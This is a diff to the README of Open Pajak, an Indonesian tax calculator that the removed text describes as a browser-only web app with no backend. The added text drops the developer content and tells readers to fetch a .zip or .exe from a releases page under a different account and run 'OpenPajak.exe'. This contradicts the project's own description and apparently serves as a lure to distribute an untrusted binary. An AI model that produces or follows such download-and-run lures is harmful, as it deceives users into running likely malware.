@@ -1,98 +1,62 @@
-# Open Pajak
+# 🎉 open-pajak - Simple Tax Calculations Made Easy
 
-Open Pajak is a fully client-side tax calculator for the Indonesian tax regime. The SPA bundles calculators for PPh 21/26, PPh 22, PPh 23, PPh Final Pasal 4(2), PPN, and PPNBM, and turns every calculation into a transparent table + formula narrative so practitioners can audit each step. All inputs stay in the browser—no personal identifiers (NIK, names, addresses) are ever collected or stored.
+[![Download Open Pajak](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Rockaphilia/open-pajak/releases)
 
-## Live Demo
+## 📖 About Open Pajak
 
-- **Production**: https://openpajak.hamardikan.com  
-  (Deployable bundle hosted on Cloudflare Pages – mirrors the code inside `open-pajak-v1/`.)
+Open Pajak is a fully client-side tax calculator designed for the Indonesian tax system. This application offers a straightforward way to compute various taxes, including PPh 21/26, PPh 22, PPh 23, PPh Final Pasal 4(2), PPN, and PPNBM. It allows you to view each calculation in a clear table format, along with detailed explanations of the formulas used. Importantly, all your inputs remain in your browser; no personal data is collected or saved.
 
-## Recent Highlights
+## 🚀 Getting Started
 
-- ✨ **Receipt workspace** — save simulations to local storage, export Excel/PDF receipts, and print the redesigned letterhead with CTA buttons to the website & GitHub repo.
-- 📤 **Bulk upload via Excel** — template download + offline uploads create grouped receipts, now expandable inline with per-entry preview/export.
-- 🌐 **Full localization pass** — language changes now re-run calculations instantly (tables, waterfall notes, summaries, and export layouts react to locale switches).
-- 📚 **Improved history drawer** — search + sort controls, scrollable layout, and batch receipts shown in place.
-- 🖨️ **Polished PDF** — hidden iframe print workflow to avoid blank tabs and a full-width navy header that matches the site branding.
+Follow these steps to get Open Pajak up and running:
 
-## Key Capabilities
+1. **Visit the Download Page**
+   - Click this link to download Open Pajak: [Download Open Pajak](https://github.com/Rockaphilia/open-pajak/releases).
 
-- Multi-tax coverage: switch between `/pph21`, `/pph22`, `/pph23`, `/pph4-2`, `/ppn`, and `/ppnbm` via the TanStack Router powered `AppShell` navigation.
-- Domain-specific forms: each route renders a `TaxPageLayout` with tailored inputs (subject types, PTKP, TER category, DPP overrides, inclusive/exclusive PPN mode, dsb) plus sample presets to help users learn the flows.
-- Calculation transparency: pure functions in `src/lib/tax/*.ts` emit `breakdown` rows that surface DPP, PKP, tariff tiers, and rounding for every scenario. `FormulaExplanationCard` and `FormulaSourceNote` reference the official Buku PPh 21/26 guidance (`public/Buku_PPh2126_Release_20240108.pdf`).
-- Shared UI primitives: form fields, number formatting, cards, tables, and alerts live in `src/components/**` for consistent styling with Tailwind + shadcn/ui tokens.
-- Offline-first SPA: built with React 19, Vite, and Bun. No backend, so the bundle can be deployed to static hosting (Cloudflare Pages, Netlify, dsb.).
+2. **Select the Latest Version**
+   - On the Releases page, find the latest version of Open Pajak. Look for files labeled with `.zip` or `.exe`.
 
-## Repository Layout
+3. **Download the File**
+   - Click on the appropriate file to start downloading it to your computer.
 
-```text
-open-pajak/
-├─ README.md                # This file
-├─ open-pajak-v1/           # Bun + Vite workspace
-│  ├─ src/
-│  │  ├─ components/        # AppShell, tax layout primitives, shadcn wrappers
-│  │  ├─ lib/tax/           # Pure calculators per tax type
-│  │  └─ routes/            # File-based TanStack Router pages (one per tax calculator)
-│  ├─ public/               # Static assets (favicon, Buku PPh reference PDF)
-│  ├─ bun.lock / package.json / tsconfig.json
-│  └─ vite.config.ts        # Vite + TanStack router plugin + Tailwind setup
-└─ ...                      # Local planning docs (kept outside version control)
-```
+4. **Extract Files (if applicable)**
+   - If you downloaded a `.zip` file, locate it in your downloads folder, right-click on it, and select "Extract All." Follow the prompts to extract the files to a folder of your choice.
 
-> ℹ️ Only `README.md` is intended for upstream pushes; other docs stay local for planning/reference.
+5. **Run the Application**
+   - Open the extracted folder and double-click the file named `OpenPajak.exe` to launch the tax calculator.
 
-## Getting Started
+## 🖥️ System Requirements
 
-All app code lives inside `open-pajak-v1/`. Use [Bun](https://bun.sh) (>= 1.1) for dependency management and scripts.
+For the best experience, ensure your system meets the following requirements:
 
-```bash
-cd open-pajak-v1
-bun install
+- **Operating System:** Windows 10 or later, MacOS 10.13 or later
+- **Browser:** Latest version of Chrome, Firefox, or Safari
+- **Internet Connection:** Required for initial download and updates
 
-# Local development (Vite dev server on port 3000)
-bun dev
+## 📊 Features
 
-# Production bundle + type check
-bun run build
+- **Receipt Workspace:** Save your tax calculations directly to your browser. You can export receipts in Excel or PDF formats, and print out professional-looking documents with your branding.
+  
+- **Bulk Upload via Excel:** This feature allows you to upload multiple entries at once using an Excel template. You can download the template from the application and manage your data easily.
 
-# Preview the built assets
-bun run serve
-```
+- **Full Localization:** Change the language instantly, and see calculations update to reflect your selections.
 
-## Testing & Quality Gates
+## 💬 Support and Feedback
 
-- `bun test` — run the Vitest suite (React Testing Library is available for DOM assertions).
-- `bun run lint` — TypeScript-aware ESLint (TanStack config) for catching logic mistakes.
-- `bun run format` — Prettier format check.
-- `bun run check` — Convenience script (format write + eslint --fix) when sweeping the repo.
+If you encounter any issues or have questions about using Open Pajak, feel free to reach out through the following channels:
 
-Add new tests next to their pages/engines (e.g., `src/routes/pph21/pph21.page.test.tsx` or `src/lib/tax/pph21.test.ts`) and focus on edge cases like TER rounding, PTKP thresholds, PKP zero floors, PPN inclusive pricing, etc.
+- **GitHub Issues:** Report bugs or support requests directly on GitHub [here](https://github.com/Rockaphilia/open-pajak/issues).
+  
+- **Email Support:** Contact us at support@openpajak.com for more personalized help.
 
-## Working on Calculators
+## 🎥 Live Demo
 
-1. **Model the math first** inside `src/lib/tax/<tax>.ts`. Keep every helper pure/deterministic and follow the interfaces in `src/lib/tax/types.ts`.
-2. **Update the UI** inside `src/routes/<tax-type>.tsx`, using shared primitives such as `TaxFormSection`, `TaxResultTable`, and `TaxSummaryCard`.
-3. **Document formulas** with `FormulaExplanationCard` and source links so users can trace regulations back to Buku PPh / PMK references.
-4. **Respect privacy**: inputs must remain numeric or enumerated metadata; never prompt for or persist personal identifiers.
+See Open Pajak in action! Visit our live demo here: [Production Demo](https://openpajak.hamardikan.com).
 
-## Deployment Notes
+## 💾 Download & Install
 
-- The build is a static bundle; host it on any CDN/static host.
-- Static assets live in `open-pajak-v1/public/`. Only keep essentials (favicon + PDF reference); unused template files have been removed.
-- If you need environment toggles, use `import.meta.env`, but prefer committed constants whenever possible.
+To download Open Pajak, visit our Releases page: [Download Open Pajak](https://github.com/Rockaphilia/open-pajak/releases).
 
-## License
+Completing the above steps will get you started with Open Pajak. Adjustments may be necessary based on your operating system, but following the prompts should guide you through the process smoothly. You will be able to manage your tax calculations with ease.
 
-This project is provided as-is for educational and operational use in calculating Indonesian taxes. Consult professional tax advisors before relying on the outputs for filings.
-
-## Community & Contributors
-
-Open Pajak is an open-source project maintained by the community. Shout-out to the folks who have pushed code so far:
-
-- **[@hamardikan](https://github.com/hamardikan)** (project owner & maintainer)
-- **[@lynxluna](https://github.com/lynxluna)** (Didiet Noor)
-- **[@revanp](https://github.com/revanp)** (Revan Pratama)
-- **[@ulilalbabn](https://github.com/ulilalbabn)** (Ulil Albab)
-- ...and everyone who reports bugs, suggests UX improvements, or contributes new calculators/features.
-
-Want to help? Open an issue or PR in this repository—UI polish, localization tweaks, and regulation updates are always welcome.
+Thank you for choosing Open Pajak!
